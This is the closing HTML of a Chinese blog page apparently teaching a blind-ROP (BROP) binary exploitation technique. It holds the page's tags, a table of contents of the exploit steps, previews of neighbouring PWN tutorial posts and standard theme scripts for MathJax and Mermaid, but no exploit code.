+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%9C%A8IDA%E9%87%8C%E6%89%BE%E5%88%B0/">在IDA里找到</a><a class="post-meta__tags" href="/tags/ROPgadget/">ROPgadget</a><a class="post-meta__tags" href="/tags/%E7%94%A8pwntools%E8%87%AA%E5%B8%A6%E7%9A%84%E5%B7%A5%E5%85%B7%E6%9E%84%E5%BB%BA%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%BB%93%E6%9E%84rt-sigreturn/">用pwntools自带的工具构建系统调用结构rt_sigreturn</a></div><div class="post-share"><div class="social-share" data-image="/%E9%80%86%E5%90%91/PWN/%E6%A0%88%E8%BF%81%E7%A7%BBstack_migration/wps331.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>如果这篇文章帮到了你，可以请我喝杯咖啡。</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/images/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/images/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/images/zhifubao.jpg" target="_blank"><img class="post-qr-code-img" src="/images/zhifubao.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/%E9%80%86%E5%90%91/PWN/16%E7%AC%AC16%E8%8A%82.Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E4%B8%8E%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6/" title="16第16节.Linux延迟绑定与安全防护机制"><img class="cover" src="/%E9%80%86%E5%90%91/PWN/16%E7%AC%AC16%E8%8A%82.Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E4%B8%8E%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6/wps212.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">16第16节.Linux延迟绑定与安全防护机制</div></div><div class="info-2"><div class="info-item-1">Linux延迟绑定与安全防护机制2021-09-29   摘抄网址在上时间部分 readelf https://wangchujiang.com/linux-command/c/readelf.html 0.ELF文件格式0-1.概述ELF（Executable and Linkable Format）文件是Linux环境中的一种二进制可执行文件。 elf的基本信息存在于elf的头部信息中，这些信息包括指令的运行框架、程序入口等，可以通过 readelf -h &lt;elf_name&gt; 来查看头部信息。 elf文件中包含许多节（section），各个节中存放不同的数据，这些节的信息存放在节头表中，可用 readelf -S &lt;file&gt; 查看，主要包括：   0-2.elf文件被加载到内存中的布局elf文件在加载进内存时，elf文件的节会被映射到内存中的段（segment），这一映射过程遵循的机制是根据各个节的权限来进行映射的。可读可写的节被映射入一个段，只读的节被映射入一个一个段。** 如下图所示：   1.编译与链接 1-1.动态链接库 一般来说，在程序的...</div></div></div></a><a class="pagination-related" href="/%E9%80%86%E5%90%91/PWN/19%E7%AC%AC19%E8%8A%82.pwntools%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/" title="19第19节.pwntools快速入门"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">19第19节.pwntools快速入门</div></div><div class="info-2"><div class="info-item-1">pwntools的安装及基本使用：http://brieflyx.me/2015/python-module/pwntools-intro/   pwntools是由Gallopsled开发的一款专用于CTF Exploit的Python库，包含了本地执行、远程连接读写、shellcode生成、ROP链的构建、ELF解析、符号泄漏等众多强大功能，可以说把exploit繁琐的过程变得简单起来。这里简单介绍一下它的使用。 安装 Pwntools的主页在pwntools.com，Github项目地址为pwntools，可以下载到最新的源码用python进行安装。也可以简单地使用pip install pwntools进行安装。 虽然Pwntools大部分的功能都是纯python实现的可以直接使用，其还是依赖一些外部的python库例如capstone等，如果使用pip安装的话可以发现安装了不少依赖的库。而如果需要使用其ROP链的构建功能的话，则需要安装libcapstone这个非Python的库，这个可以到capstone-download去下载，不过需要注意的一点就是要保持pytho...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#brop-%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8-canary-%E5%92%8C-pie"><span class="toc-number">1.</span> <span class="toc-text">brop 如何判断是否存在 canary 和 pie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#STEP-1-%E8%8E%B7%E5%8F%96-stop-gadget-start-%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">2.</span> <span class="toc-text">STEP 1 : 获取 stop_gadget ( _start 函数地址 )</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ELF-%E7%A8%8B%E5%BA%8F%E7%89%B9%E6%80%A7%E4%B9%8B%E4%B8%80-%EF%BC%9A-%E5%9B%BA%E5%AE%9A%E5%AD%98%E5%9C%A8%E7%9A%84-pop6-ret-%E5%8F%8A%E5%85%B6%E6%84%8F%E4%B9%89"><span class="toc-number">3.</span> <span class="toc-text">ELF 程序特性之一 ： 固定存在的 pop6_ret 及其意义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ELF-%E7%A8%8B%E5%BA%8F%E7%89%B9%E6%80%A7%E4%B9%8B%E4%BA%8C-%EF%BC%9A-ELF%E7%A8%8B%E5%BA%8F%E5%9B%BA%E5%AE%9A%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%B4"><span class="toc-number">4.</span> <span class="toc-text">ELF 程序特性之二 ： ELF程序固定的数据头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#STEP-4-dump-%E7%A8%8B%E5%BA%8F"><span class="toc-number">5.</span> <span class="toc-text">STEP 4 : dump 程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#STEP-5-%EF%BC%9A%E8%8E%B7%E5%8F%96-puts-got"><span class="toc-number">6.</span> <span class="toc-text">STEP 5 ：获取 puts_got</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#STEP-6-%E8%8E%B7%E5%8F%96-libc-%E7%89%88%E6%9C%AC"><span class="toc-number">7.</span> <span class="toc-text">STEP 6 : 获取 libc 版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#STEP-7%EF%BC%9A%E6%89%93-ret2libc"><span class="toc-number">8.</span> <span class="toc-text">STEP 7：打 ret2libc</span></a></li></ol></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 乙太</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        loader: {
+          load: [
+            // Four font extension packages (optional)
+            //- '[tex]/bbm',
+            //- '[tex]/bboldx',
+            //- '[tex]/dsfont',
+            '[tex]/mhchem'
+          ],
+          paths: {
+            'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+
+            //- // Four font extension packages (optional)
+            //- 'mathjax-bbm-extension': '[mathjax]/../@mathjax/mathjax-bbm-font-extension',
+            //- 'mathjax-bboldx-extension': '[mathjax]/../@mathjax/mathjax-bboldx-font-extension',
+            //- 'mathjax-dsfont-extension': '[mathjax]/../@mathjax/mathjax-dsfont-font-extension',
+            'mathjax-mhchem-extension': '[mathjax]/../@mathjax/mathjax-mhchem-font-extension'
+          }
+        },
+        output: {
+          font: 'mathjax-newcm',
+        },
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+          packages: {
+            '[+]': [
+              'mhchem'
+            ]
+          }
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          menuOptions: {
+            settings: {
+              enrich: false  // Turn off Braille and voice narration text automatic generation
+            }
+          },
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@4.1.0/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script><script>(() => {
+  const parseViewBox = viewBox => {
+    if (!viewBox) return null
+    const parts = viewBox.trim().split(/[\s,]+/).map(n => Number(n))
+    if (parts.length !== 4 || parts.some(n => Number.isNaN(n))) return null
+    return parts
+  }
+
+  const getSvgViewBox = svg => {
+    const attr = parseViewBox(svg.getAttribute('viewBox'))
+    if (attr) return attr
+
+    // Fallback: use bbox to build a viewBox
+    try {
+      const bbox = svg.getBBox()
+      if (bbox && bbox.width && bbox.height) return [bbox.x, bbox.y, bbox.width, bbox.height]
+    } catch (e) {
+      // getBBox may fail on some edge cases; ignore
+    }
+
+    const w = Number(svg.getAttribute('width')) || 0
+    const h = Number(svg.getAttribute('height')) || 0
+    if (w > 0 && h > 0) return [0, 0, w, h]
+    return [0, 0, 100, 100]
+  }
+
+  const setSvgViewBox = (svg, vb) => {
+    svg.setAttribute('viewBox', `${vb[0]} ${vb[1]} ${vb[2]} ${vb[3]}`)
+  }
+
+  const clamp = (v, min, max) => Math.max(min, Math.min(max, v))
+
+  const openSvgInNewTab = ({ source, initViewBox }) => {
+    const getClonedSvg = () => {
+      if (typeof source === 'string') {
+        const template = document.createElement('template')
+        template.innerHTML = source.trim()
+        const svg = template.content.querySelector('svg')
+        return svg ? svg.cloneNode(true) : null
+      }
+      if (source && typeof source.cloneNode === 'function') {
+        return source.cloneNode(true)
+      }
+      return null
+    }
+
+    const clone = getClonedSvg()
+    if (!clone) return
+    if (initViewBox && initViewBox.length === 4) {
+      clone.setAttribute('viewBox', initViewBox.join(' '))
+    }
+    if (!clone.getAttribute('xmlns')) clone.setAttribute('xmlns', 'http://www.w3.org/2000/svg')
+    if (!clone.getAttribute('xmlns:xlink') && clone.outerHTML.includes('xlink:')) {
+      clone.setAttribute('xmlns:xlink', 'http://www.w3.org/1999/xlink')
+    }
+    // inject background to match current theme
+    const isDark = document.documentElement.getAttribute('data-theme') === 'dark'
+    const bg = getComputedStyle(document.body).backgroundColor || (isDark ? '#1e1e1e' : '#ffffff')
+    if (!clone.style.background) clone.style.background = bg
+
+    const serializer = new XMLSerializer()
+    const svgSource = serializer.serializeToString(clone)
+    const htmlSource = `<!doctype html><html><head><meta charset="utf-8" />
+      <style>
+        html, body { width: 100%; height: 100%; margin: 0; display: flex; align-items: center; justify-content: center; background: ${bg}; }
+        svg { max-width: 100%; max-height: 100%; height: auto; width: auto; }
+      </style>
+      </head><body>${svgSource}</body></html>`
+    const blob = new Blob([htmlSource], { type: 'text/html;charset=utf-8' })
+    const url = URL.createObjectURL(blob)
+    window.open(url, '_blank', 'noopener')
+    setTimeout(() => URL.revokeObjectURL(url), 30000)
+  }
+
+  const attachMermaidViewerButton = wrap => {
+    let btn = wrap.querySelector('.mermaid-open-btn')
+    if (!btn) {
+      btn = document.createElement('button')
+      btn.type = 'button'
+      btn.className = 'mermaid-open-btn'
+      wrap.appendChild(btn)
+    }
+
+    btn.innerHTML = '<i class="fa fa-search fa-fw" aria-hidden="true"></i>'
+
+    if (!btn.__mermaidViewerBound) {
+      btn.addEventListener('click', e => {
+        e.preventDefault()
+        e.stopPropagation()
+        const svg = wrap.__mermaidOriginalSvg || wrap.querySelector('svg')
+        if (!svg) return
+        const initViewBox = wrap.__mermaidInitViewBox
+        if (typeof svg === 'string') {
+          openSvgInNewTab({ source: svg, initViewBox })
+          return
+        }
+        openSvgInNewTab({ source: svg, initViewBox })
+      })
+      btn.__mermaidViewerBound = true
+    }
+  }
+
+  // Zoom around a point (px, py) in the SVG viewport (in viewBox coordinates)
+  const zoomAtPoint = (vb, factor, px, py) => {
+    const w = vb[2] * factor
+    const h = vb[3] * factor
+    const nx = px - (px - vb[0]) * factor
+    const ny = py - (py - vb[1]) * factor
+    return [nx, ny, w, h]
+  }
+
+  const initMermaidGestures = wrap => {
+    const svg = wrap.querySelector('svg')
+    if (!svg) return
+
+    // Ensure viewBox exists so gestures always work
+    const initVb = getSvgViewBox(svg)
+    wrap.__mermaidInitViewBox = initVb
+    wrap.__mermaidCurViewBox = initVb.slice()
+    setSvgViewBox(svg, initVb)
+
+    // Avoid binding multiple times on themeChange/pjax
+    if (wrap.__mermaidGestureBound) return
+    wrap.__mermaidGestureBound = true
+
+    // Helper: map client (viewport) coordinate -> viewBox coordinate
+    const clientToViewBox = (clientX, clientY) => {
+      const rect = svg.getBoundingClientRect()
+      const vb = wrap.__mermaidCurViewBox || getSvgViewBox(svg)
+      const x = vb[0] + (clientX - rect.left) * (vb[2] / rect.width)
+      const y = vb[1] + (clientY - rect.top) * (vb[3] / rect.height)
+      return { x, y, rect, vb }
+    }
+
+    const state = {
+      pointers: new Map(),
+      startVb: null,
+      startDist: 0,
+      startCenter: null
+    }
+
+    const clampVb = vb => {
+      const init = wrap.__mermaidInitViewBox || vb
+      const minW = init[2] * 0.1
+      const maxW = init[2] * 10
+      const minH = init[3] * 0.1
+      const maxH = init[3] * 10
+      vb[2] = clamp(vb[2], minW, maxW)
+      vb[3] = clamp(vb[3], minH, maxH)
+      return vb
+    }
+
+    const setCurVb = vb => {
+      vb = clampVb(vb)
+      wrap.__mermaidCurViewBox = vb
+      setSvgViewBox(svg, vb)
+    }
+
+    const onPointerDown = e => {
+      // Allow only primary button for mouse
+      if (e.pointerType === 'mouse' && e.button !== 0) return
+      svg.setPointerCapture(e.pointerId)
+      state.pointers.set(e.pointerId, { x: e.clientX, y: e.clientY })
+
+      if (state.pointers.size === 1) {
+        state.startVb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+      } else if (state.pointers.size === 2) {
+        const pts = [...state.pointers.values()]
+        const dx = pts[0].x - pts[1].x
+        const dy = pts[0].y - pts[1].y
+        state.startDist = Math.hypot(dx, dy)
+        state.startVb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+        state.startCenter = { x: (pts[0].x + pts[1].x) / 2, y: (pts[0].y + pts[1].y) / 2 }
+      }
+    }
+
+    const onPointerMove = e => {
+      if (!state.pointers.has(e.pointerId)) return
+      state.pointers.set(e.pointerId, { x: e.clientX, y: e.clientY })
+
+      // Pan with 1 pointer
+      if (state.pointers.size === 1 && state.startVb) {
+        const p = [...state.pointers.values()][0]
+        const prev = { x: e.clientX - e.movementX, y: e.clientY - e.movementY }
+        // movementX/Y unreliable on touch, compute from stored last position
+        const last = wrap.__mermaidLastSinglePointer || p
+        const dxClient = p.x - last.x
+        const dyClient = p.y - last.y
+        wrap.__mermaidLastSinglePointer = p
+
+        const { rect } = clientToViewBox(p.x, p.y)
+        const vb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+        const dx = dxClient * (vb[2] / rect.width)
+        const dy = dyClient * (vb[3] / rect.height)
+        setCurVb([vb[0] - dx, vb[1] - dy, vb[2], vb[3]])
+        return
+      }
+
+      // Pinch zoom with 2 pointers
+      if (state.pointers.size === 2 && state.startVb && state.startDist > 0) {
+        const pts = [...state.pointers.values()]
+        const dx = pts[0].x - pts[1].x
+        const dy = pts[0].y - pts[1].y
+        const dist = Math.hypot(dx, dy)
+        if (!dist) return
+        const factor = state.startDist / dist // dist bigger => zoom in (viewBox smaller)
+
+        const cx = (pts[0].x + pts[1].x) / 2
+        const cy = (pts[0].y + pts[1].y) / 2
+        const centerClient = { x: cx, y: cy }
+
+        const pxy = clientToViewBox(centerClient.x, centerClient.y)
+        const cpx = pxy.x
+        const cpy = pxy.y
+
+        const vb = zoomAtPoint(state.startVb, factor, cpx, cpy)
+        setCurVb(vb)
+      }
+    }
+
+    const onPointerUpOrCancel = e => {
+      state.pointers.delete(e.pointerId)
+      if (state.pointers.size === 0) {
+        state.startVb = null
+        state.startDist = 0
+        state.startCenter = null
+        wrap.__mermaidLastSinglePointer = null
+      } else if (state.pointers.size === 1) {
+        // reset single pointer baseline to avoid jump
+        wrap.__mermaidLastSinglePointer = [...state.pointers.values()][0]
+      }
+    }
+
+    // Wheel zoom (mouse/trackpad)
+    const onWheel = e => {
+      // ctrlKey on mac trackpad pinch; we treat both as zoom
+      e.preventDefault()
+      const delta = e.deltaY
+      const zoomFactor = delta > 0 ? 1.1 : 0.9
+      const { x, y } = clientToViewBox(e.clientX, e.clientY)
+      const vb = (wrap.__mermaidCurViewBox || getSvgViewBox(svg)).slice()
+      setCurVb(zoomAtPoint(vb, zoomFactor, x, y))
+    }
+
+    const onDblClick = () => {
+      const init = wrap.__mermaidInitViewBox
+      if (!init) return
+      wrap.__mermaidCurViewBox = init.slice()
+      setSvgViewBox(svg, init)
+    }
+
+    svg.addEventListener('pointerdown', onPointerDown)
+    svg.addEventListener('pointermove', onPointerMove)
+    svg.addEventListener('pointerup', onPointerUpOrCancel)
+    svg.addEventListener('pointercancel', onPointerUpOrCancel)
+    svg.addEventListener('wheel', onWheel, { passive: false })
+    svg.addEventListener('dblclick', onDblClick)
+  }
+
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+
+      // Clear old render (themeChange/pjax will rerun)
+      const oldSvg = item.querySelector('svg')
+      if (oldSvg) oldSvg.remove()
+      item.__mermaidGestureBound = false
+
+      const config = mermaidSrc.dataset.config ? JSON.parse(mermaidSrc.dataset.config) : {}
+      if (!config.theme) {
+        config.theme = theme
+      }
+      const mermaidThemeConfig = `%%{init: ${JSON.stringify(config)}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+        if (false) initMermaidGestures(item)
+        item.__mermaidOriginalSvg = svg
+        if (false) attachMermaidViewerButton(item)
+      }
+
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.2/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="/js/github-chart.js"></script><script src="/live2d-widget/autoload.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索知识库" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
